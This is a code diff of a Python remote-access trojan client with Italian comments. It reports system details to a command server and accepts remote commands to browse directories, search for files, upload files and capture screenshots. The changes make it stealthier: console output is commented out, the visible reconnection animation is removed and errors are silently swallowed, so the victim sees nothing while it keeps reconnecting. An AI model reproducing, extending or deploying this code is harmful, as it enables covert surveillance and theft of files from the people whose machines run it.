@@ -11,7 +11,6 @@ import signal
 from os import system
 from threading import Timer
 from traceback import print_exc
-
 import pyautogui
 
 IP = "localhost"
@@ -67,10 +66,10 @@ def clientConnection():
     try:
         client = socket(AF_INET, SOCK_STREAM)
         client.connect(ADDR)
-        print(f"[CONNECTED] Connessione avvenuta\n")
+        #print(f"[CONNECTED] Connessione avvenuta\n")
         return client
     except:
-        print(f"[ERROR] Connessione non riuscita: riprovo tra 10 secondi...\n")
+        #print(f"[ERROR] Connessione non riuscita: riprovo tra 10 secondi...\n")
         return "errore"
 
 
@@ -81,24 +80,17 @@ def sendInfo(client):
         try:
             infos = "Operating System: " + platform.system() + "\nMachine: " + platform.machine() + "\nHost: " + platform.node() + "\nProcessor: " + platform.processor() + "\nPlatform: " + platform.platform() + "\nRelease: " + platform.release() + "\nPath: " + os.getcwd()
             client.send((str((len(infos)))).encode(FORMAT))
-            time.sleep(5)
+            time.sleep(2)
             client.send(((infos)).encode(FORMAT))
             mando = 0
-        except Exception as e:
-            if e.__class__.__name__ == "ConnectionResetError":
-                mando=0
-            else:
-                risposta = "null"
-                while risposta != '0' and risposta != '1':
-                    client.send(("[ERROR] Dati non mandati correttamente, riprovare? 1-Y/0-N ").encode(FORMAT))
-                    risposta = client.recv(1024).decode(FORMAT)
-                    if risposta == '1':
-                        mando = 1
-                    elif risposta == '0':
-                        mando = 0
+        except Exception:
+            mando = 0
+            raise Exception
 
 
 def filespath(tipologia, client):
+    time.sleep(4)
+
     allType = tipologia
     listaType = tipologia.split()
     result = [""]
@@ -135,18 +127,16 @@ def filespath(tipologia, client):
 
     try:
         filesize = sys.getsizeof(result)
-        print(filesize)
         client.send((str(filesize)).encode(FORMAT))
-        time.sleep(3)
+        time.sleep(5)
         client.send((result).encode(FORMAT))
 
-    except:
-        #traceback.print_exc()
-        client.send(("Download fallito").encode(FORMAT))
-
+    except Exception:
+        raise Exception
 
 #cerco tutti i file con estensione indicata in un certo path
 def find(comando, client):
+    time.sleep(5)
     try:
         counter_punti=0
         counter_spazi=0
@@ -178,12 +168,8 @@ def find(comando, client):
         data = ''.join(specificlist)
         client.send((data).encode(FORMAT))
 
-    except Exception as e:
-        if e.__class__.__name__ == "ConnectionResetError":
-            client.send(("Connessione interrotta").encode(FORMAT))
-        else:
-            client.send(("Si è verificato un errore, verifica il comando").encode(FORMAT))
-
+    except Exception:
+        raise Exception
 
 # funzione di remote control
 def openRemoteControl(client):
@@ -193,6 +179,7 @@ def openRemoteControl(client):
             client.send((os.getcwd()).encode(FORMAT))
             comando = client.recv(1024).decode(FORMAT)
             time.sleep(0.5)
+
             if comando[0:8] == "download":
                 try:
                     filename = comando[10:len(comando) - 1]
@@ -200,20 +187,22 @@ def openRemoteControl(client):
                     with open(filename, 'rb') as f:
                         line = f.read(filesize)
                         client.send((str(filesize)).encode(FORMAT))
-                        time.sleep(3)
+                        time.sleep(4)
                         client.send(line)
                         f.close()
                 except:
-                    client.send(("Download fallito").encode(FORMAT))
+                    pass
 
             elif comando[0:5] == "cd ..":
                 os.chdir("..")
+
             elif comando[0:2] == "cd":
                 if comando[3:4] != "C" and comando[3:4] != "/":
                     path = comando[3:]
                     os.chdir(os.getcwd() + "/" + path)
                 else:
                     os.chdir(comando[3:])
+
             elif comando[0:2] == "ls":
                 if len(comando) == 2:
                     # ritorna una lista
@@ -229,20 +218,27 @@ def openRemoteControl(client):
                     data = pickle.dumps(listdir)
                     client.send(data)
                     time.sleep(1.5)
+
             elif comando == "pwd":
                 client.send((os.getcwd()).encode(FORMAT))
-                time.sleep(1.5)
+
             elif comando[0:9] == "filespath":
                 estensione = comando[10:]
-                filespath(estensione, client)
-                time.sleep(1.5)
+                try:
+                    filespath(estensione, client)
+                except:
+                    pass
+
             elif comando[0:4] == "find":
-                find(comando, client)
-                time.sleep(1.5)
+                try:
+                    find(comando, client)
+                except:
+                    pass
+
             elif comando[0:4] == "info":
                 infos = "Operating System: " + platform.system() + "\nMachine: " + platform.machine() + "\nHost: " + platform.node() + "\nProcessor: " + platform.processor() + "\nPlatform: " + platform.platform() + "\nRelease: " + platform.release() + "\nPath: " + os.getcwd() + "\n"
                 client.send(((infos)).encode(FORMAT))
-                time.sleep(1.5)
+
             elif comando[0:10]=="screenshot":
                 myScreenshot = pyautogui.screenshot()
                 if platform.system() == "Windows":
@@ -258,23 +254,23 @@ def openRemoteControl(client):
                     with open(filename, 'rb') as f:
                         line = f.read(filesize)
                         client.send((str(filesize)).encode(FORMAT))
-                        time.sleep(3)
+                        time.sleep(4)
                         client.send(line)
                         f.close()
                 except:
-                    client.send(("Download fallito").encode(FORMAT))
+                    pass
 
                 os.remove("screen.png")
-                #Tutti gli altri commandi
+
             else:
                 pass
 
         except Exception as e:
             #traceback.print_exc()
-            client.send(("[ERROR] Command " + comando + " not found ...\n").encode(FORMAT))
-            comando = "null"
             if e.__class__.__name__== "ConnectionResetError":
                 comando="exit"
+            else:
+                comando="null"
 
 def main():
     try:
@@ -284,13 +280,18 @@ def main():
         if client == "errore":
             raise Exception
         else:
-            print(f"[SENDING] Invio informazioni sul mio sistema al server\n")
-            sendInfo(client)
-            time.sleep(2)
+            #print(f"[SENDING] Invio informazioni sul mio sistema al server\n")
+            time.sleep(5)
+            try:
+                sendInfo(client)
+            except Exception as e:
+                raise e
+
 
             try:
+                time.sleep(5)
                 openRemoteControl(client)
-                time.sleep(2)
+
             except Exception as e:
                 if e.__class__.__name__ == "ConnectionResetError":
                     print(f"[CONNECTION INTERRUPTED] Connessione interrotta\n")
@@ -303,9 +304,10 @@ def main():
 
     except Exception as e:
         if e.__class__.__name__ == "ConnectionResetError":
-            print(f"[CONNECTION INTERRUPTED] Connessione interrotta\n")
+            #print(f"[CONNECTION INTERRUPTED] Connessione interrotta\n")
             raise e
-        raise e
+        else:
+            raise e
 
 # start trojan
 # thread_trojan=Thread(target=trojanBehaviour)
@@ -317,27 +319,8 @@ if __name__ == "__main__":
 
     while True:
         try:
-            print(f"[CONNECTION SEARCH] Sto cercando una connessione\n")
-            t_end = time.time() + 5
-            while time.time() < t_end:
-                clearScreen()
-                print(".", end="")
-                time.sleep(1)
-                print(".", end="")
-                time.sleep(1)
-                print(".")
-                time.sleep(1)
-                clearScreen()
+            #print(f"[CONNECTION SEARCH] Sto cercando una connessione\n")
             main()
         except:
-            print(f"[RECONNECTION] Cerco un server a cui connettermi\n")
-            t_end = time.time() + 7
-            while time.time() < t_end:
-                clearScreen()
-                print(".", end="")
-                time.sleep(1)
-                print(".", end="")
-                time.sleep(1)
-                print(".")
-                time.sleep(1)
-                clearScreen()
+            #print(f"[RECONNECTION] Cerco un server a cui connettermi\n")
+            time.sleep(5)
